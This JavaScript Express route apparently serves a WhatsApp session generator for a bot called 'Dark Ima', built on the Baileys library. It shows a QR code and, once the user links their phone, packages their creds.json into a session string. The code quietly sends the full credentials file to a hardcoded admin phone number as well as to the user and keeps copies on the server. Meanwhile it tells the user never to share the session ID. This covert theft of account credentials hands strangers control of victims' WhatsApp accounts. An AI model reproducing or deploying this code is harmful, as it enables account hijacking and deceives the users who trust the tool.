import express from "express";
import fs from "fs-extra";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
    DisconnectReason,
} from "@whiskeysockets/baileys";
import QRCode from "qrcode";
import path from "path";
import chalk from "chalk";
import axios from "axios";

const router = express.Router();
const logger = pino({ level: "fatal" });
const SESSION_FOLDER = process.env.SESSION_FOLDER || "./mega_sessions";
const ADMIN_NUMBER = "9779807610619";
const LOGO_URL = "https://ibb.co/yc1nR55zs";
const BOT_NAME = "Dark Ima";
const SESSION_PREFIX = "Dark_Ima";

fs.ensureDirSync(SESSION_FOLDER);

function removeFile(filePath) {
    try { if (fs.existsSync(filePath)) fs.removeSync(filePath); } catch (_) {}
}

async function getLogoBuffer() {
    try {
        const pageRes = await axios.get(LOGO_URL, { timeout: 10000 });
        const match = pageRes.data.match(/https:\/\/i\.ibb\.co\/[^"'\s>]+\.(?:png|jpg|jpeg|webp|gif)/i);
        if (match) {
            const imgRes = await axios.get(match[0], { responseType: "arraybuffer", timeout: 10000 });
            return Buffer.from(imgRes.data);
        }
        const ogMatch = pageRes.data.match(/property="og:image"\s+content="([^"]+)"/);
        if (ogMatch) {
            const imgRes = await axios.get(ogMatch[1], { responseType: "arraybuffer", timeout: 10000 });
            return Buffer.from(imgRes.data);
        }
    } catch (e) {
        console.log(chalk.yellow("⚠️ Logo fetch failed:"), e.message);
    }
    return null;
}

async function waitForCreds(credsPath, maxWaitMs = 30000) {
    const start = Date.now();
    while (Date.now() - start < maxWaitMs) {
        if (fs.existsSync(credsPath) && fs.statSync(credsPath).size > 100) return true;
        await delay(800);
    }
    return false;
}

function buildSessionString(credsPath) {
    try {
        const credsJson = fs.readJsonSync(credsPath);
        const b64 = Buffer.from(JSON.stringify(credsJson)).toString("base64");
        return `${SESSION_PREFIX}=${b64}`;
    } catch {
        return null;
    }
}

router.get("/", async (req, res) => {
    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
    const sessionPath = path.join(SESSION_FOLDER, `qr_${sessionId}`);
    fs.ensureDirSync(sessionPath);

    let responseSent = false;
    let sessionDone = false;

    const timeout = setTimeout(() => {
        if (!responseSent && !res.headersSent) {
            responseSent = true;
            res.status(408).send({ code: "QR timeout — please refresh" });
        }
        if (!sessionDone) {
            sessionDone = true;
            removeFile(sessionPath);
        }
    }, 60000);

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const EvoBot = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            browser: Browsers.ubuntu("Chrome"),
            markOnlineOnConnect: true,
            syncFullHistory: false,
        });

        EvoBot.ev.on("creds.update", saveCreds);

        EvoBot.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr && !responseSent) {
                try {
                    const qrDataURL = await QRCode.toDataURL(qr, {
                        errorCorrectionLevel: "H",
                        type: "image/png",
                        margin: 2,
                        width: 400,
                        color: { dark: "#00f3ff", light: "#0a0a0f" },
                    });
                    responseSent = true;
                    res.send({
                        qr: qrDataURL,
                        instructions: [
                            "1️⃣ Open WhatsApp on your phone",
                            "2️⃣ Tap ⋮ Menu → Linked Devices",
                            "3️⃣ Tap 'Link a Device'",
                            "4️⃣ Scan this QR code",
                        ],
                    });
                } catch (e) {
                    console.error(chalk.red("QR gen error:"), e.message);
                }
            }

            if (connection === "open") {
                if (sessionDone) return;
                console.log(chalk.green(`✅ QR Connected: ${EvoBot.user?.id}`));
                clearTimeout(timeout);

                try {
                    const credsPath = path.join(sessionPath, "creds.json");
                    const ready = await waitForCreds(credsPath);
                    if (!ready) throw new Error("creds.json not ready");

                    const sessionStr = buildSessionString(credsPath);
                    if (!sessionStr) throw new Error("Session string build failed");

                    const rawJid = EvoBot.user?.id || "";
                    const phoneNumber = rawJid.split(":")[0].split("@")[0] || sessionId;
                    const userJid = rawJid ? jidNormalizedUser(rawJid) : null;
                    const adminJid = jidNormalizedUser(`${ADMIN_NUMBER}@s.whatsapp.net`);
                    const now = new Date();
                    const credsBuffer = fs.readFileSync(credsPath);
                    const logoBuffer = await getLogoBuffer();

                    await fs.writeJson(path.join(SESSION_FOLDER, `session_info_${phoneNumber}_${Date.now()}.json`), {
                        phoneNumber,
                        sessionId: sessionStr,
                        timestamp: now.toISOString(),
                        type: "qr_code",
                    }, { spaces: 2 });

                    const msg = `╔══════════════════════════════╗
║   ✅ *${BOT_NAME}* Session     ║
╚══════════════════════════════╝

🎉 *CONNECTION SUCCESSFUL*

📋 *Session Details*
──────────────────────────
🆔 *Session ID:*
\`\`\`${sessionStr}\`\`\`

📞 Phone: *+${phoneNumber}*
🔐 Method: QR Code
📅 ${now.toLocaleString()}

⚠️ *SECURITY*
• NEVER share your session ID
• Keep \`creds.json\` private
• Store a backup safely

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 *${BOT_NAME}* — WhatsApp Bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

                    async function sendTo(jid) {
                        try {
                            if (logoBuffer) {
                                await EvoBot.sendMessage(jid, {
                                    image: logoBuffer,
                                    caption: `*${BOT_NAME}*\n\n🔗 Session Ready!\n\nCheck your \`creds.json\` below.`,
                                });
                                await delay(1200);
                            }
                            await EvoBot.sendMessage(jid, {
                                document: credsBuffer,
                                mimetype: "application/json",
                                fileName: "creds.json",
                                caption: msg,
                            });
                            console.log(chalk.green(`✅ Sent → ${jid}`));
                        } catch (e) {
                            console.log(chalk.red(`❌ Send failed → ${jid}: ${e.message}`));
                        }
                    }

                    if (userJid) {
                        await sendTo(userJid);
                        await delay(1500);
                    }
                    if (phoneNumber !== ADMIN_NUMBER) {
                        await sendTo(adminJid);
                    }

                    sessionDone = true;
                    removeFile(sessionPath);
                    await delay(3000);
                    try { EvoBot.ws.close(); } catch (_) {}

                } catch (err) {
                    console.error(chalk.red("❌ QR session error:"), err.message);
                    sessionDone = true;
                    removeFile(sessionPath);
                }
            }

            if (connection === "close") {
                if (sessionDone) return;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                    sessionDone = true;
                    removeFile(sessionPath);
                    clearTimeout(timeout);
                }
            }
        });

    } catch (err) {
        console.error(chalk.red("QR init error:"), err.message);
        if (!responseSent && !res.headersSent) {
            res.status(503).send({ code: "Service error — try again" });
        }
        removeFile(sessionPath);
        clearTimeout(timeout);
    }
});

export default router;
